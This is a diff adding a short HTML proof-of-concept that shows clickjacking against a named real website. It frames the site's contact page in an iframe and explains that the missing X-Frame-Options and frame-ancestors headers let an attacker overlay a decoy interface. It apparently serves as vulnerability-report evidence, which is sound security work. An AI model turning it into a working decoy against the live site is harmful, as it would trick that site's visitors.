@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head><title>Clickjacking PoC - innspark.in</title>
+<style>
+  body{font-family:sans-serif;text-align:center;padding:20px}
+  iframe{width:90%;height:600px;border:2px solid red}
+  .note{color:#900;font-weight:bold}
+</style>
+</head>
+<body>
+  <h2>Clickjacking Proof-of-Concept</h2>
+  <p class="note">https://www.innspark.in/ loads in an iframe because the origin omits
+     X-Frame-Options and frame-ancestors (CSP). An attacker can overlay a decoy UI.</p>
+  <iframe src="https://www.innspark.in/contact"></iframe>
+</body>
+</html>
